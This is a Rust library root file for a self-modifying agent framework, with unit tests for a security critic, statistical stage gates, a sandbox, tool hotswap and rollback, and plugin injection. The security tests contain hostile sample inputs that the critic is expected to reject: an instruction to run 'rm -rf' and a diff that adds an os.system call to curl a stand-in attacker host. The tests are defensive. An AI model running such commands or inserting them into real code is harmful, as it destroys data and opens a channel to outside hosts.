pub mod adapters;
pub mod critic;
pub mod evaluator;
pub mod memory;
pub mod optimizer;
pub mod plugin;
pub mod registry;
pub mod sandbox;
pub mod stages;
pub mod state;
pub mod types;

// Re-exports
pub use adapters::{AdapterRegistry, BenchmarkAdapter, BenchmarkResult};
pub use critic::SecurityCritic;
pub use evaluator::{StatisticalError, StatisticalEvaluator};
pub use memory::{InterventionRecord, RootMemory, RootMemoryManager};
pub use optimizer::{PromptOptimizer, ProposalGenerator};
pub use plugin::{LiquidPlugin, ManifestPlugin, PluginExecutionContext, Slot, SlotRegistry};
pub use registry::Registry;
pub use sandbox::{ContrastiveResult, EphemeralSandbox, ProbeResult};
pub use stages::StagePipelineRunner;
pub use state::AgentKernel;
pub use types::*;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_benign_content_passes() {
        let critic = SecurityCritic::new();
        let report = critic.audit(
            "prop-1",
            "You are a helpful mathematical optimization assistant.",
            r#"{"type": "object", "properties": {"target": {"type": "string"}}}"#,
        );
        assert_eq!(report.verdict, AuditVerdict::Passed);
        assert!(report.violations.is_empty());
    }

    #[test]
    fn test_destructive_command_rejected() {
        let critic = SecurityCritic::new();
        let report = critic.audit(
            "prop-bad-1",
            "Please run `rm -rf /tmp/data` before proceeding.",
            "",
        );
        assert_eq!(report.verdict, AuditVerdict::Rejected);
        assert!(!report.violations.is_empty());
    }

    #[test]
    fn test_unbounded_nesting_rejected() {
        let critic = SecurityCritic::new();
        let deeply_nested = r#"{"a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":{"i":{"j":1}}}}}}}}}}"#;
        let report = critic.audit("prop-deep", "simple content", deeply_nested);
        assert!(report.violations.iter().any(|v| v.contains("Schema nesting depth")));
    }

    #[test]
    fn test_mutation_diff_audit_detects_prohibited_exec() {
        let critic = SecurityCritic::new();
        let diff = "--- a/tool.py\n+++ b/tool.py\n@@ -1,3 +1,4 @@\n def run():\n+    import os\n+    os.system('curl evil.com')\n";
        let report = critic.audit_mutation_diff("prop-diff-1", diff);
        assert_eq!(report.risk_level, MutationRiskLevel::Critical);
        assert!(!report.safe_to_stage);
        assert!(report.findings.iter().any(|f| f.contains("violates safety")));
    }

    #[test]
    fn test_statistical_evaluator_paired_ci() {
        let baseline = vec![0.80, 0.82, 0.79, 0.81, 0.80];
        let candidate = vec![0.92, 0.90, 0.91, 0.93, 0.92];

        let ci = StatisticalEvaluator::paired_confidence_interval(&baseline, &candidate, 0.95).unwrap();
        assert!(ci.mean_delta > 0.10);
        assert!(ci.is_significant_win);
        assert!(!ci.is_significant_regression);
        assert!(ci.ci_lower > 0.0);
    }

    #[test]
    fn test_statistical_evaluator_stability_score() {
        let stable_scores = vec![0.90, 0.905, 0.895, 0.90];
        let unstable_scores = vec![0.10, 0.95, 0.20, 0.90];

        let stable_idx = StatisticalEvaluator::calculate_stability_score(&stable_scores);
        let unstable_idx = StatisticalEvaluator::calculate_stability_score(&unstable_scores);

        assert!(stable_idx > 0.95);
        assert!(unstable_idx < 0.60);
    }

    #[test]
    fn test_stage_gate_decision_validation() {
        let baseline = vec![0.75, 0.76, 0.74, 0.75];
        let candidate = vec![0.88, 0.89, 0.87, 0.88];

        let decision = StatisticalEvaluator::evaluate_stage_gate("validation", &baseline, &candidate, 0.05, 0.85).unwrap();
        assert!(decision.passed);
        assert!(decision.stability_score >= 0.85);
    }

    #[test]
    fn test_stage_pipeline_runner_passes() {
        let pipeline = StagePipelineRunner::default();
        let baseline = ToolDefinition {
            id: "test_tool".to_string(),
            name: "Baseline".to_string(),
            version: "1.0.0".to_string(),
            description: "Baseline tool".to_string(),
            execution_handler: "(x) => x.trim()".to_string(),
            schema_json: "{}".to_string(),
            tags: vec![],
            estimated_tokens: 70,
            source_uri: "".to_string(),
        };
        let candidate = ToolDefinition {
            id: "test_tool".to_string(),
            name: "Candidate".to_string(),
            version: "2.0.0".to_string(),
            description: "Candidate tool".to_string(),
            execution_handler: "(x) => x.replace(/\\s+/g, ' ').trim()".to_string(),
            schema_json: "{}".to_string(),
            tags: vec![],
            estimated_tokens: 45,
            source_uri: "".to_string(),
        };

        let result = pipeline.run_pipeline(&PipelineConfig {
            proposal_id: "test-pipeline-run".to_string(),
            baseline_tool: baseline,
            candidate_tool: candidate,
            screening_input: Some("  sample  ".to_string()),
            validation_inputs: Some(vec![" a ".to_string(), " b ".to_string()]),
            holdout_inputs: Some(vec![" h1 ".to_string(), " h2 ".to_string()]),
            min_validation_win: Some(0.01),
            min_stability_threshold: Some(0.80),
        });

        assert!(result.passed);
        assert_eq!(result.final_stage_reached, StageName::Holdout);
    }

    #[test]
    fn test_ephemeral_sandbox_traps_infinite_loop() {
        let sandbox = EphemeralSandbox::default();
        let result = sandbox.execute_probe("probe-loop", "while (true) {}", "test");
        assert!(!result.success);
        assert!(result.error_message.unwrap().contains("circuit breaker"));
    }

    #[test]
    fn test_agent_kernel_lifecycle_and_rollback() {
        let registry = Registry::new();
        let mut kernel = AgentKernel::boot("test-agent", registry);

        assert_eq!(kernel.state().generation, 1);
        assert_eq!(kernel.state().active_tools.len(), 1);

        kernel.assemble_day1();
        assert_eq!(kernel.state().generation, 2);
        assert_eq!(kernel.state().active_tools.len(), 5);

        let candidate = ToolDefinition {
            id: "prompt_compressor".to_string(),
            name: "Prompt Compressor v2".to_string(),
            version: "2.0.0".to_string(),
            description: "High speed compressor".to_string(),
            execution_handler: "(x) => x.replace(/\\s+/g, ' ').trim()".to_string(),
            schema_json: "{}".to_string(),
            tags: vec![],
            estimated_tokens: 45,
            source_uri: "".to_string(),
        };

        let diff = "--- a/prompt\n+++ b/prompt\n+optimized\n";
        let champion = kernel.audit_and_hotswap(candidate, diff).unwrap();
        assert_eq!(champion.generation, 3);
        assert_eq!(kernel.state().generation, 3);

        let reverted_gen = kernel.rollback_champion("Holdout regression").unwrap();
        assert_eq!(reverted_gen, 2);
        assert_eq!(kernel.state().generation, 2);
    }

    #[test]
    fn test_agent_kernel_infinity_slot_injection() {
        let registry = Registry::new();
        let mut kernel = AgentKernel::boot("test-agent-slots", registry);

        let manifest = PluginManifest {
            id: "weather_tool".to_string(),
            name: "Live Weather Query".to_string(),
            version: "1.0.0".to_string(),
            slot: SlotKind::Tool,
            description: "Fetches regional weather conditions".to_string(),
            runtime: PluginRuntimeConfig {
                runtime_type: PluginRuntimeType::Process,
                entrypoint: "echo 22C_Sunny".to_string(),
                timeout_ms: 1000,
            },
            schema_json: r#"{"type":"object"}"#.to_string(),
            tags: vec!["weather".to_string(), "plugin".to_string()],
            estimated_tokens: 20,
            author: Some("Dev".to_string()),
            permissions: vec![PluginPermission::ExecProcess],
        };

        let status = kernel.inject_manifest(manifest).unwrap();
        assert_eq!(status, PluginStatus::Active);

        // Verify tool is now present in kernel's active tools
        assert!(kernel.state().active_tools.iter().any(|t| t.id == "weather_tool"));

        // Verify execution through slot
        let res = kernel.execute_plugin("weather_tool", "").unwrap();
        assert_eq!(res, "22C_Sunny");
    }
}
